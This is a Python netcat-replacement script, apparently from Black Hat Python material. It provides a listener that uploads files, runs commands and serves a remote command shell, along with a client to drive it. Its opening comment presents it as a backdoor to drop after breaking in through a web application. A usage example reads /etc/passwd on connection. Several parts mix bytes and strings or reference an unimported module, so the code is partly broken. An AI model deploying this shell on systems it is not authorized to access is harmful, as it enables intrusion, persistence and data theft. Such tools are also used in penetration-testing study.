#!/usr/bin/env python3
# This is a simple replacement of `nc`. Usually network administrators remove
# `nc` but have python installed. In those cases, it is useful to create
# network client and server that you can push files, or have listener that
# gives you command line access. If you've broken in through a web
# application, it is definitely worth dropping a python callback to give you
# secondary access without having to first burn one of your trojans or
# backdoors.
import sys
import socket
import threading
import getopt
import subprocess
from traceback import print_exc

# define some global variables

listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""

def usage():
    print("Net tool");
    print()
    print("Usage: repNC.py -t target_host -p target_port")
    print("-l --listen                - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run   - execute the given file upon receiving a connection")
    print("-c command --command       - initialize a command shell")
    print("-u --upload-destination    - upon receiving a connection upload a file and write to [destination]")
    print()
    print()
    print("Examples: ")
    print("$ repNC.py -t 192.168.0.1 -p 5555 -l -c")
    print("$ repNC.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("$ repNC.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("$ echo 'ABCDE' | repNC.py -t 192.168.0.1. -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the command line option

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target",  "port",
                                    "command", "upload"])
    except getopt.GetoptError as err:
        print(traceback.format_exc())
        usage()
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

    # Are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()
        # send data off
        client_sender(buffer)
    # we are going to listen and potentially
    # upload things, execute commands, and drop a shell back
    # depending on our command line options above
    if listen:
        print("Listen in true")
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # connect to our target host
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
        while True:
            # now wait for data back
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= str(data)
                if recv_len < 4096:
                    break
            response = response[2:]
            response = response[:-1]
            flag = 0
            if response.startswith("<BHP:#>"):
                print()
                print(response, end='')
                flag = 1
            else:
                print(response)
            # wait for more input
            if flag == 1:
                buffer = input("")
            else:
                buffer = input("<BHP:#> ")
            buffer += "\n"

            # send it off
            client.send(buffer.encode())
    except Exception as e:
        print("Type is: " + e.__class__.__name__)
        print_exc()
        print ("[*] Exception! Exiting.")
        # tear down the connection
        client.close()

def server_loop():
    global target
    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,
        args=(client_socket,))
        client_thread.start()

def run_command(command):
    # trim the newline
    command = command[:-3]
    print("Command: "+ command)
    # run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
        # send the output back to the client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command
    # check for upload
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""
        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        # now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" %
            upload_destination)
    # check for command execution
    if len(execute):
        # run the command
        output = run_command(execute)
        client_socket.send(output)
    # now we go into another loop if a command shell was requested
    if command:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ".encode())
            # now we receive until we see a linefeed
            #(enter key)
            cmd_buffer = ""
            #while "\n" not in cmd_buffer:
            cmd_buffer += str(client_socket.recv(1024))
            if cmd_buffer.startswith("b'"):
                cmd_buffer = cmd_buffer[2:]

            # send back the command output
            response = run_command(cmd_buffer)
            # send back the response
            temp = str(response)[2:]
            temp = temp[:-3]
            response = temp
            client_socket.send(response.encode())
main()


